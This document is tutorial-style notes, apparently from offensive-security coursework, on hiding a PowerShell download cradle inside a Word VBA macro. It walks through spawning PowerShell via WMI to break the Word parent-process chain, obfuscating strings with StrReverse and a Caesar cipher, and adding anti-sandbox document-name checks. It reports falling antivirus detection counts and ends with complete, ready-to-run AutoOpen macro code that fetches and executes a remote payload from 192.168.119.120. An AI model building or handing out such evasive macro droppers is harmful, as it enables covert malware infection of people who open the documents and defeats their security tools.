# TOC
+ [Hiding PowerShell Inside VBA](#hiding-powershell-inside-vba)
  + [Dechaining PowerShell with WMI](#dechaining-powershell-with-wmi)
  + [Obfuscating VBA](#obfuscating-vba)
+ [Final code](#final-code)
# Hiding PowerShell Inside VBA

### 1. **Why Use PowerShell in VBA Payloads?**

- Advantage: No **first-stage shellcode** embedded in the document.
- Instead, VBA uses a **PowerShell download cradle** to fetch + execute shellcode.

### Example (basic runner):

```vbnet
Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
  Shell strArg, vbHide
End Sub
```

📌 **Expectation:** Low detection (no embedded shellcode).

📌 **Reality:** 8 AV detections (more than unencrypted Meterpreter shellcode).

**Why flagged?**

1. Use of `Shell` → suspicious, creates PowerShell as **child of Word**.
2. Clear PowerShell download cradle string.

## Dechaining PowerShell with WMI

### Problem:

- PowerShell spawned directly from Word → AV flags "Word → PowerShell" chain.

### Solution:

- Use **WMI** to spawn PowerShell.
- Parent process becomes `WmiPrvSE.exe`, not Word → less suspicious.

### Key components:

- `GetObject("winmgmts:")` → connect to WMI.
- `Get("Win32_Process")` → WMI class for process actions.
- `.Create <process>` → spawn new process.

### Example:

```vbnet
Sub MyMacro()
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
  MyMacro
End Sub
```

📌 **Result:**

- PowerShell runs under **WmiPrvSE.exe**, not Word.
    
    <img width="855" height="342" alt="image" src="https://github.com/user-attachments/assets/2fd737dc-0aa4-4d5f-bfb0-33a441bee606" />

    
- Still flagged (7 AVs) due to **unobfuscated download cradle**.
    
    ```visual-basic
    Sub MyMacro
      strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
      GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
    End Sub
    
    Sub AutoOpen()
        Mymacro
    End Sub
    
    ```
    

## **Obfuscating VBA**

### Why?

- Detection is **signature-based** → plain text strings (`powershell`, `http://...`, `winmgmts`) are flagged.
- **Goal**: Evade **signature-based detection** by obfuscating clear-text strings.
- **Targets** for obfuscation:
    - PowerShell cradle.
    - WMI connection string (`winmgmts:`).
    - WMI class name (`Win32_Process`).

### Simple Obfuscation – `StrReverse`

- Reverse all strings, restore with `StrReverse`.
    
    ```visual-basic
    Sub MyMacro()
      Dim strArg As String
      strArg = StrReverse("))'txt.nur/...//:ptth'(gnirtsdaolnwod...)")
    
      GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
    End Sub
    ```
    
    📌 **Result:**
    
    - Works, but `StrReverse` is itself suspicious.
    - **Improvement**: Wrap `StrReverse` in a custom benign function.

### **Improved StrReverse**

- Wrap in a benign function with non-suspicious names.
    
    ```visual-basic
    Function Bears(Cows)
        Bears = StrReverse(Cows)
    End Function
    
    Sub MyMacro()
      Dim strArg As String
      strArg = Bears("))'txt.nur/...//:ptth'(...)")
    
      GetObject(Bears(":stmgmniw")).Get(Bears("ssecorP_23niW")).Create strArg, Null, Null, pid
    End Sub
    ```
    
    📌 **Result:**
    
    - Detections drop from **7 → 4**.
    - AVs less likely to flag but still vulnerable to engines that reverse strings.

### Advanced Obfuscation – Custom Caesar Cipher + Decimal Encoding

- Convert each char → decimal ASCII → +17 (Caesar cipher).
    - Convert ASCII to decimal.
    - Apply Caesar shift (e.g., +17).
    - Pad to 3 digits.
    - Concatenate into encrypted string.
- Example PowerShell encryption (simplified):
    
    ```visual-basic
    $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    
    [string]$output = ""
    
    $payload.ToCharArray() | %{
        [string]$thischar = [byte][char]$_ + 17
        if($thischar.Length -eq 1)
        {
            $thischar = [string]"00" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 2)
        {
            $thischar = [string]"0" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 3)
        {
            $output += $thischar
        }
    }
    $output | clip
    
    ```
    
    Produces long numeric string (encrypted payload).
    
- **VBA Decryption Functions:**
    
    ```visual-basic
    Function Pears(Beets)
        Pears = Chr(Beets - 17)
    End Function
    
    Function Strawberries(Grapes)
        Strawberries = Left(Grapes, 3)
    End Function
    
    Function Almonds(Jelly)
        Almonds = Right(Jelly, Len(Jelly) - 3)
    End Function
    
    Function Nuts(Milk)
        Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
        Loop While Len(Milk) > 0
        Nuts = Oatmilk
    End Function
    
    ```
    
- Usage:
    
    ```visual-basic
    Sub MyMacro()
        Dim Apples As String, Water As String
        Apples = "129128136118131132121118125125049..." ' encrypted string
        Water = Nuts(Apples)
        GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    End Sub
    ```
    
    📌 **Result:**
    
    - Detection reduced to **2 AVs**.

### **Bypassing Heuristic Detection**

- **Problem**: Even encrypted strings may trigger heuristic analysis (sandboxing/emulation).
- **Solution**: Detect emulation by checking document properties.
    - AV sandboxes often rename files.
    - Check if document name matches expected (`runner.doc`).
    - Exit if mismatch.
    
    ```visual-basic
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
      Exit Function
    End If
    ```
    
    📌 **Result:**
    
    - Only **1 AV** detects.
    - Achieved **very low detection** using obfuscation + heuristics checks.

---

### **Final Takeaways**

1. **Direct PowerShell execution via Shell** → highly detectable.
2. **Dechaining via WMI** → reduces suspicious parent-child relation.
3. **String Obfuscation**:
    - Simple reversal helps but leaves traces.
    - Custom Caesar cipher encryption is stronger.
4. **Heuristic Evasion**:
    - Detect sandboxing by checking file properties or environment.
    - Exit early to avoid triggering behavior analysis.
5. **Detection Results**:
    - Initial Shell method: 8 products.
    - WMI de-chained: 7 products.
    - StrReverse obfuscation: 4 products.
    - Caesar cipher obfuscation: 2 products.
    - Heuristic check (file name): 1 product.

# Final code

1. **Payload Generation**
    
    writing a **PowerShell download cradle**
    
    ```powershell
    $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    ```
    
    This command downloads and executes remote powershell payloads in memory → no file drop.
    
2. **Encryption / Encoding Scheme**
    
    ```visual-basic
    $output = ""
    $payload.ToCharArray() | %{
        $output += ([byte][char]$_ + 17).ToString("000")
    }
    $output | clip
    ```
3. Make sure word file name is `runner.doc` 
    
4. **VBA code**
    
    The VBA macros are broken into small functions to avoid static signature detection.
    
    ```visual-basic
    ' ========================
    ' Helper Functions
    ' ========================
    Function Pears(Beets)
        Pears = Chr(Beets - 17)         ' Reverse the +17 shift
    End Function
    
    Function Strawberries(Grapes)
        Strawberries = Left(Grapes, 3)  ' Take 3 digits at a time
    End Function
    
    Function Almonds(Jelly)
        Almonds = Right(Jelly, Len(Jelly) - 3) ' Remove processed 3 digits
    End Function
    
    Function Nuts(Milk)
        Dim Oatmilk As String
    		Oatmilk = ""
        Do
            Oatmilk = Oatmilk + Pears(Strawberries(Milk))
            Milk = Almonds(Milk)
        Loop While Len(Milk) > 0
        Nuts = Oatmilk
    End Function
    
    ' ========================
    ' Main Macro
    ' ========================
    Function MyMacro()
    
        ' Anti-sandbox trick: check document name
        If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
            Exit Function
        End If
        If Environ("USERNAME") = "sandbox" Then Exit Function
        
        Dim Apples As String, Water As String
        Dim Tea As String, Coffee As Variant, Napkin As Variant
    
        ' Encrypted PowerShell payload
        Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
        
        ' Decrypt payload
        Water = Nuts(Apples)
    		
    
        Tea = ""          ' Current directory (empty)
    		Coffee = 0        ' Startup info
    		' Napkin will receive the PID
        
        ' Execute payload via WMI (stealthy execution)
          GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    End Function
    
    Sub AutoOpen()
        MyMacro
    End Sub
    ```
